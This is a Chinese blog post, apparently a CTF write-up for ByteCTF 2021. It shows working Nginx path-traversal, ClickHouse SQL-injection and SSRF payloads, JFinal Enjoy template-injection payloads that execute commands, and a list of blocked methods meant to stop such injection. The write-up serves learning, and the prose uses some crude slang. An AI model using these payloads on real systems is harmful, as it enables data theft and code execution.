@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Web-double sqli这题是真的学新知识，完全没用过的 clickhouse，看了一下午的文档。 考点：  Nginx 目录穿越 clickhouse sql 注入  构造 &#x2F;files..&#x2F; 可以访问到根目录，以读取配置文件及一些敏感信息：（Nginx在配置别名(Alias)的时候,如果忘记加 &#x2F;,将造成一个目录穿越漏洞） 12port: 9000user_01: e3b0c44298f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021_ByteCTF_WP">
+<meta property="og:url" content="http://example.com/2021/10/16/2021-ByteCTF-WP/index.html">
+<meta property="og:site_name" content="歪比巴卜">
+<meta property="og:description" content="Web-double sqli这题是真的学新知识，完全没用过的 clickhouse，看了一下午的文档。 考点：  Nginx 目录穿越 clickhouse sql 注入  构造 &#x2F;files..&#x2F; 可以访问到根目录，以读取配置文件及一些敏感信息：（Nginx在配置别名(Alias)的时候,如果忘记加 &#x2F;,将造成一个目录穿越漏洞） 12port: 9000user_01: e3b0c44298f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/10/16/gsOl4y5HeBSJ26a.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/10/16/JqVWQIX2ALd3btO.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/19/JzLsYclhZ54MwGR.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/10/19/uyHkMsU7lWLbeSQ.jpg">
+<meta property="article:published_time" content="2021-10-16T12:42:59.000Z">
+<meta property="article:modified_time" content="2021-10-31T03:48:40.909Z">
+<meta property="article:author" content="Du1L0v3">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/10/16/gsOl4y5HeBSJ26a.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2021_ByteCTF_WP</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!--
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2021/10/20/2021-Jomadas-WEB3-WP/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/16/2021-ByteCTF-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&text=2021_ByteCTF_WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&is_video=false&description=2021_ByteCTF_WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2021_ByteCTF_WP&body=Check out this article: http://example.com/2021/10/16/2021-ByteCTF-WP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&name=2021_ByteCTF_WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/16/2021-ByteCTF-WP/&t=2021_ByteCTF_WP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-double-sqli"><span class="toc-number">1.</span> <span class="toc-text">Web-double sqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Unsecure-Blog"><span class="toc-number">2.</span> <span class="toc-text">Web-Unsecure Blog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Aginx"><span class="toc-number">3.</span> <span class="toc-text">Web-Aginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-frequently"><span class="toc-number">4.</span> <span class="toc-text">Misc-frequently</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2021_ByteCTF_WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Du1L0v3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-16T12:42:59.000Z" itemprop="datePublished">2021-10-16</time>
+        
+        (Updated: <time datetime="2021-10-31T03:48:40.909Z" itemprop="dateModified">2021-10-31</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web-double-sqli"><a href="#Web-double-sqli" class="headerlink" title="Web-double sqli"></a>Web-double sqli</h2><p>这题是真的学新知识，完全没用过的 clickhouse，看了一下午的文档。</p>
+<p>考点：</p>
+<ul>
+<li>Nginx 目录穿越</li>
+<li>clickhouse sql 注入</li>
+</ul>
+<p>构造 /files../ 可以访问到根目录，以读取配置文件及一些敏感信息：（Nginx在配置别名(Alias)的时候,如果忘记加 /,将造成一个目录穿越漏洞）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">port: 9000</span><br><span class="line">user_01: e3b0c44298fc1c149afb</span><br></pre></td></tr></table></figure>
+
+<p>随便输了点七里八里的值得到了后端逻辑</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ByteCTF <span class="keyword">FROM</span> hello <span class="keyword">WHERE</span> <span class="number">1</span> <span class="operator">=</span> `$<span class="keyword">sql</span>`</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/16/gsOl4y5HeBSJ26a.jpg"></p>
+<p>clickhouse 的文档：<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/sql-reference/statements/select/all/">https://clickhouse.com/docs/zh/sql-reference/statements/select/all/</a></p>
+<p>可以构造出：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.tables limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> name <span class="keyword">from</span> system.databases limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf.hint limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf.flag limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>clickhouse 和之前学过的 sql 有蛮多区别，我们当前的用户是 user_02，没有权限去读 ctf.flag，在 /var/lib/clickhouse/ 发现了 user_01 用户及其密码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ATTACH <span class="keyword">USER</span> user_01 IDENTIFIED <span class="keyword">WITH</span> plaintext_password <span class="keyword">BY</span> <span class="string">&#x27;e3b0c44298fc1c149afb&#x27;</span>;</span><br><span class="line">ATTACH <span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> ctf.<span class="operator">*</span> <span class="keyword">TO</span> user_01;</span><br></pre></td></tr></table></figure>
+
+<p>饶了四五个小时绕回来最开始看到的 url 函数（老子一🔪把尼🐎🦈了，然后爬尼🐎坟上撒尿，最后偷吃尼🐎贡品🍎）</p>
+<p>最后，clickhouse 提供了一个屌寄霸接口在 8123 端口，可以利用 clickhouse 自带的函数 url 来 ssrf 然后打内网</p>
+<blockquote>
+<p>The HTTP interface lets you use ClickHouse on any platform from any programming language. We use it for working from Java and Perl, as well as shell scripts. In other departments, the HTTP interface is used from Perl, Python, and Go. The HTTP interface is more limited than the native interface, but it has better compatibility.</p>
+<p>By default, <code>clickhouse-server</code> listens for HTTP on port 8123 (this can be changed in the config).</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> url(<span class="string">&#x27;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag&#x27;</span>, CSV, <span class="string">&#x27;column1 String&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>flag 给👴出：<code>ByteCTF&#123;e3b0c44298fc1c149afbf4c8&#125;</code></p>
+<p><img src="https://i.loli.net/2021/10/16/JqVWQIX2ALd3btO.png"></p>
+<hr>
+<p>最后补充一个🍋研究的盲注的思路~</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">OR</span> startsWith((extractAll(((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.databases limit <span class="number">1</span>,<span class="number">1</span>)<span class="number">.2</span>), <span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]),<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>extractAll(str, ‘.’) 可以将字符串逐位分割，同时数组可以使用 [0] 进行访问而元组可以使用 .0 的方式访问。使用 startsWith 配合字符串可以进行逐位爆破。</p>
+<h2 id="Web-Unsecure-Blog"><a href="#Web-Unsecure-Blog" class="headerlink" title="Web-Unsecure Blog"></a>Web-Unsecure Blog</h2><p>后台 admin，账号密码 jfnial / 111111</p>
+<p>可以在浏览发现一个 jfinal enjoy 模板的 ssti，可以表达式注入：（文档：<a target="_blank" rel="noopener" href="https://jfinal.com/doc/6-4%EF%BC%89">https://jfinal.com/doc/6-4）</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#(x=123)#(x)#(123)</span><br></pre></td></tr></table></figure>
+
+<p>构造生成类：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#(1.class.forName(&quot;java.lang.Runtime&quot;))</span><br><span class="line">#(1.class.forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&#x27;java.lang.ProcessBuilder(&#x27;calc&#x27;).start()&#x27;))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>上述表达式有问题，比赛的时候有段时间测的可以，不过后来不行了，如图<img src="https://i.loli.net/2021/10/19/JzLsYclhZ54MwGR.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/19/uyHkMsU7lWLbeSQ.jpg"></p>
+<p>贴一下 JFinal Enjoy 的内置黑名单的类 <code>com.jfinal.template.expr.ast.MethodKit</code> 的源码：<a target="_blank" rel="noopener" href="https://github.com/jfinal/jfinal/blob/master/src/main/java/com/jfinal/template/expr/ast/MethodKit.java%EF%BC%8C%E5%AE%83%E7%9A%84%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%AD%E5%AE%9A%E4%B9%89%E4%BA%86%E9%99%90%E5%88%B6%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%9A">https://github.com/jfinal/jfinal/blob/master/src/main/java/com/jfinal/template/expr/ast/MethodKit.java，它的静态代码块中定义了限制类和方法的黑名单：</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String[] ms = &#123;</span><br><span class="line">			<span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;getDeclaringClass&quot;</span>, <span class="string">&quot;forName&quot;</span>, <span class="string">&quot;newInstance&quot;</span>, <span class="string">&quot;getClassLoader&quot;</span>,</span><br><span class="line">			<span class="string">&quot;invoke&quot;</span>, <span class="comment">// &quot;getMethod&quot;, &quot;getMethods&quot;, // &quot;getField&quot;, &quot;getFields&quot;,</span></span><br><span class="line">			<span class="string">&quot;notify&quot;</span>, <span class="string">&quot;notifyAll&quot;</span>, <span class="string">&quot;wait&quot;</span>,</span><br><span class="line">			<span class="string">&quot;exit&quot;</span>, <span class="string">&quot;loadLibrary&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="comment">// &quot;load&quot;,</span></span><br><span class="line">			<span class="string">&quot;stop&quot;</span>, <span class="string">&quot;suspend&quot;</span>, <span class="string">&quot;resume&quot;</span>, <span class="comment">// &quot;setDaemon&quot;, &quot;setPriority&quot;</span></span><br><span class="line">			</span><br><span class="line">			<span class="string">&quot;removeForbiddenClass&quot;</span>,</span><br><span class="line">			<span class="string">&quot;removeForbiddenMethod&quot;</span></span><br><span class="line">		&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在拜读了 @Mrkaixin 大大大师傅（谭总牛逼）的 WP 后，学习到了可以通过调用一些类的静态方法来获取实例，比如 <code>net.sf.ehcache.util.ClassLoaderUtil createNewInstance</code>，这个方法没被黑名单过滤（推荐一波这个网站：<a target="_blank" rel="noopener" href="https://www.tabnine.com/code%EF%BC%8C%E6%90%9C">https://www.tabnine.com/code，搜</a> JAVA 代码很好用）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createNewInstance</span><span class="params">(String className)</span> <span class="keyword">throws</span> CacheException </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> createNewInstance(className, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>靶机无了，寄！</p>
+<h2 id="Web-Aginx"><a href="#Web-Aginx" class="headerlink" title="Web-Aginx"></a>Web-Aginx</h2><p>面向大师傅 WP 的解题：<a target="_blank" rel="noopener" href="https://impakho.com/post/bytectf-2021-aginx-writeup">https://impakho.com/post/bytectf-2021-aginx-writeup</a></p>
+<h2 id="Misc-frequently"><a href="#Misc-frequently" class="headerlink" title="Misc-frequently"></a>Misc-frequently</h2><p>被🍋带着出了一半 flag，彳亍，赛后再跟着🍋的 WP 复现了一下，最后还是出了，彳亍。</p>
+<p>在 WireShark 分析可以发现发现大量来自 xxxx.bytedanec.net 的 DNS 查询请求，将其域名的第一段分离出来，使用 Base64 进行解码可以得到一张没用的图片，继续进行分析，将剩余 DNS 请求中的 i、o 提取出来进行处理（CyberChef）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;i\\n&#39;&#125;,&#39;1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;o\\n&#39;&#125;,&#39;0&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39; &#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Binary(&#39;Space&#39;,8)</span><br><span class="line"></span><br><span class="line">The first part of flag: ByteCTF&#123;^_^enJ0y&amp;y0u9</span><br></pre></td></tr></table></figure>
+
+<p>得到第一段 flag。随后可以在流量包中发现 DHCP 包，将 ACK 中包含的 IP Address Lease Time 提取出来可以得到后一半 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整 flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;^_^enJ0y&amp;y0u9se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-double-sqli"><span class="toc-number">1.</span> <span class="toc-text">Web-double sqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Unsecure-Blog"><span class="toc-number">2.</span> <span class="toc-text">Web-Unsecure Blog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Aginx"><span class="toc-number">3.</span> <span class="toc-text">Web-Aginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-frequently"><span class="toc-number">4.</span> <span class="toc-text">Misc-frequently</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/16/2021-ByteCTF-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&text=2021_ByteCTF_WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&is_video=false&description=2021_ByteCTF_WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2021_ByteCTF_WP&body=Check out this article: http://example.com/2021/10/16/2021-ByteCTF-WP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&title=2021_ByteCTF_WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/16/2021-ByteCTF-WP/&name=2021_ByteCTF_WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/16/2021-ByteCTF-WP/&t=2021_ByteCTF_WP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Du1L0v3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+         <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
